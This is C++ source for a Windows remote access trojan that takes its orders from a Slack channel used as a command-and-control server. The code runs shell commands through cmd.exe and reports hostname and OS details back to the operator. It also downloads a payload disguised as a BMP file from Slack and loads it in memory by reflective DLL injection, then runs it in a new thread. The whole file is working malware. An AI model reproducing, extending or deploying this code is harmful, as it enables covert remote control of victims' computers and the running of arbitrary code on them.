#include "rat.h"
#include "utility.h"
#include "srdi.h"

#include "lwhp/Buffer.h"
#include "lwhp/NameValueCollection.h"
#include "lwhp/Exception.h"
#include "lwhp/Environment.h"
#include "lwhp/String.h"
#include "slack/slackerrors.h"
#include "slack/web/client.h"
#include "slack/web/slack_response.h"

#include "json.hpp"

#include <iostream>


using std::string;
using std::vector;
using slack::web::WebClient;
using slack::web::SlackResponse;
using slack::SlackApiError;
using slack::SlackClientError;
using libwinhttp::NameValueCollection;
using libwinhttp::SystemException;
using json = nlohmann::json;


RemoteAccessTool::RemoteAccessTool(const StringDict& slack_authentication) :
	session_uid(_gen_random_string(12)),
	oauth_token(slack_authentication.get("oauth_token", "")),
	c2_channel(slack_authentication.get("c2_channel", "")),
	sleep_timer(10),
	heartbeat(true),
	client(WebClient(oauth_token)),
	commands(RemoteAccessCapabilities())
{

}
RemoteAccessTool::~RemoteAccessTool()
{
	if (!_sent_termination) {
		try {
			send_termination("Exiting for unknown reason!");
		}
		catch (...) {
			
		}
	}
}

void RemoteAccessTool::_terminate()
{
	send_termination("I'm outta here!");
}

string RemoteAccessTool::_gen_random_string(int length)
{
	srand((unsigned int)time(0));
	char letters_digits[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	string res;
	for (auto i = 0; i < length; i++) {
		res += letters_digits[rand() % 62];
	}
	return res;
}

string RemoteAccessTool::get_channel_id(const string& channel_name)
{
	string _channel_name = channel_name;
	if (_channel_name._Starts_with("#"))
		_channel_name.erase(0, 1);
	try {
		SlackResponse channel_list = client.channels_list();
		channel_list.validate();
		for (auto& channel : channel_list.json_val["channels"]) {
			string this_channel_name = channel["name"].get<string>();
			if (this_channel_name == _channel_name) {
				return channel["id"].get<string>();
			}
		}
	}
	catch (const slack::SlackClientError & e)
	{
		
		Log(e.what().c_str());
	}
	return "";
}

vector<RemoteAccessTool::LogEntry> RemoteAccessTool::get_channel_log() noexcept
{
	vector<LogEntry> log_lines{};
	double ts;
	string log_text;

	try {
		if (c2_channel_id.empty())
			c2_channel_id = get_channel_id(c2_channel);
	}
	catch (SlackClientError & e) {
		Log(e.what().c_str());
		return log_lines;
	}

	try {
		NameValueCollection opt;
		if (last_timestamp > 0.0)
			opt.set("oldest", std::to_string(last_timestamp));
		auto channel_history = client.channels_history(c2_channel_id, opt).validate().json_val["messages"];
		

		for (auto& log_entry : channel_history) {
			string ts_str = log_entry["ts"].get<string>();
			try
			{
				ts = std::stod(ts_str);
			}
			catch (const std::invalid_argument&)
			{
				Log("Error converting the timestamp!", ts_str);
				ts = 0;
			}
			if ((last_timestamp == 0.0) || (ts > last_timestamp))
			{
				log_text = log_entry["text"].get<string>();
				if (log_text._Starts_with("Hey " + session_uid + ",")) {
					log_lines.push_back(LogEntry{ log_text, ts });
				}
			}
		}
	}
	catch (SlackClientError & e) {
		Log(e.what().c_str());
	}

	return log_lines;
}

bool RemoteAccessTool::get_tasking()
{
	string todo;
	
	for (auto& [task, ts] : get_channel_log())
	{
		if (ts > last_timestamp)
			last_timestamp = ts;
		todo = libwinhttp::trim(task.substr(task.find_first_of(',')+1));
		std::cout << todo << std::endl;


		
		
		if (todo._Starts_with("gtfo")) {
			_terminate();
			return true;
		}
		else if (todo._Starts_with("who am i")) {
			send_text(commands.shell_execute("cmd.exe /c whoami"));
		}
		else if (todo._Starts_with("be quiet")) {
			this->heartbeat = false;
		}
		else if (todo._Starts_with("start talking")) {
			this->heartbeat = true;
		}
		else if (todo._Starts_with("talk every ")) {
			todo.erase(0, 11);
			try {
				unsigned int amount = std::stoi(todo);
				this->sleep_timer = amount;
			}
			catch (const std::invalid_argument&) {
				send_text("Bruh, I dunno what you're talkin' bout.");
			}
		}
		else if (todo._Starts_with("grab and execute ")) {
			todo.erase(0, 17);
			string filename = todo;
			std::vector<string> urls;

			try {
				auto files = client.files_list().validate();
				std::for_each(files.json_val["files"].begin(), files.json_val["files"].end(), [&filename, &urls](const json& j) { 
					if (j["name"].get<string>() == filename) {
						urls.push_back(j["url_private_download"].get<string>());
					}
					});
			}
			catch (SlackApiError & e) {
				send_text("Ahhh, api error: " + e.what());
				continue;
			}
			if (urls.size() == 1) {
				send_text("Yeah, I can do that.");
				download_and_run(urls[0]);
			}
			else if (urls.size() <= 0) {
				send_text("Bruh, that file doesn't exist!");
			}
			else if (urls.size() > 1) {
				send_text("Bruh, there's more than one of those... so you should fix that.");
			}
		}
	}

	return true;
}

bool RemoteAccessTool::download_and_run(const string& url, const string& outputfile, const string& command) {
	SlackResponse response = client.download_url(url, "image/bmp");
	UINT_PTR hLoadedDll = srdi((LPSTR)(response.rawdata.begin()+2));	
	Function exportedFunction = (Function)GetProcAddressR(hLoadedDll, "run");
	if (exportedFunction) {
		DWORD dwThreadId;
		HANDLE hThread = CreateThread(
			NULL,                   
			0,                      
		    (LPTHREAD_START_ROUTINE)exportedFunction,       
			NULL,				    
			0,                      
			&dwThreadId);
		if (hThread == NULL)
		{
			Log("CreateThread failed");
			return false;
		}
	}
	return true;
}

bool RemoteAccessTool::is_running()
{
	return !_sent_termination;
}


bool RemoteAccessTool::send_text(const string& text)
{
	string full_text = "`[" + session_uid + "]`: " + text;

	try {
		SlackResponse resp = client.chat_postMessage(c2_channel, full_text).validate();
		return true;
	}
	catch (SlackClientError & e) {
		
		Log(("Errored! " + e.what()).c_str());
		return false;
	}
}

bool RemoteAccessTool::send_heartbeat()
{
	return send_text("Heartbeat Timestamp: `" + _get_timestamp() + "`");
}


bool RemoteAccessTool::send_termination(const string& error_message) noexcept
{
	_sent_termination = true;
	return send_text("Termination Timestamp: `" + _get_timestamp() + "`\n\t*Reason:* `" + error_message + "`");
}

string RemoteAccessTool::_get_timestamp()
{
	std::stringstream ss;
	auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
	ss << std::put_time(std::localtime(&now), "%F %T");
	return ss.str();
}


 
RemoteAccessCapabilities::RemoteAccessCapabilities()
{
	_initial_connect();
	connect_timestamp = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
}

void RemoteAccessCapabilities::_initial_connect()
{
	hostname = libwinhttp::Environment::nodeName();
	os_version = libwinhttp::Environment::osName() + " " + libwinhttp::Environment::osVersion();
	os_architecture = libwinhttp::Environment::osArchitecture();
	
	 
}



string RemoteAccessCapabilities::shell_execute(const string& command_with_args)
{
	std::stringstream ss;
	try {
		
		char buff[4096];
		FILE* pPipe;
		if( (pPipe = _popen(command_with_args.c_str(), "rt" )) == NULL )
			throw SystemException("Error spawning process");

		

		while (fgets(buff, 4096, pPipe))
		{
			ss << buff;
		}
	}
	catch (SystemException & exc) {
		Log(exc.what());
		ss << "Bruh, that did not work: " << exc.what();
	}

	return ss.str();
}

string RemoteAccessCapabilities::run_survey()
{
	std::stringstream survey;
	survey << "`New Connection Survey:`\n";
	survey << "\t*Hostname:* " << hostname << "\n";
	survey << "\t*Operating System:* " << os_version << "\n";
	survey << "\t*Operating System Architecture:* " << os_architecture << "\n";
	std::stringstream ss;
	
	
	survey << "\t*IP Addresses:* " << ss.str() << "\n";
	survey << "\t*Connected Timestamp:* " << std::put_time(std::localtime(&connect_timestamp), "%F %T");

	return survey.str();
}
